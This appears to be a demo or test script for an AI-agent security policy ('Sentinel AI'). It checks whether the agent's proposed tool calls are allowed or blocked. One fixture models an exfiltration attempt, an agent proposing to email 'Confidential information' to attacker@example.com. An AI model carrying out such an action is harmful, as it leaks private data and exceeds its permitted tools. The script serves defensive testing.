from backend.app.security.policy import (
    ActionProposal,
    AuthorizationContext,
    ToolName,
    authorize_action,
)

print("\n===== SENTINEL AI SECURITY DEMO =====")

# TEST 1: Normal email
normal = ActionProposal(
    tool=ToolName.SUMMARIZE_EMAIL,
    params={"content": "Meeting tomorrow at 10 AM."}
)

normal_context = AuthorizationContext(
    permitted_tools=(ToolName.SUMMARIZE_EMAIL,)
)

result = authorize_action(normal, normal_context)

print("\n1. NORMAL EMAIL")
print("RESULT:", "ALLOWED" if result.allowed else "BLOCKED")
print("REASON:", result.reason)


# TEST 2: Unauthorized email sending
attack = ActionProposal(
    tool=ToolName.SEND_EMAIL,
    params={
        "to": "attacker@example.com",
        "body": "Confidential information"
    }
)

attack_context = AuthorizationContext(
    permitted_tools=(ToolName.SUMMARIZE_EMAIL,)
)

result = authorize_action(attack, attack_context)

print("\n2. MALICIOUS ACTION PROPOSAL")
print("RESULT:", "ALLOWED" if result.allowed else "BLOCKED")
print("REASON:", result.reason)


# TEST 3: Sensitive action without approval
sensitive_context = AuthorizationContext(
    permitted_tools=(ToolName.SEND_EMAIL,)
)

result = authorize_action(attack, sensitive_context)

print("\n3. EMAIL WITHOUT APPROVAL")
print("RESULT:", "ALLOWED" if result.allowed else "BLOCKED")
print("REASON:", result.reason)

print("\n===== EVALUATION COMPLETE =====")
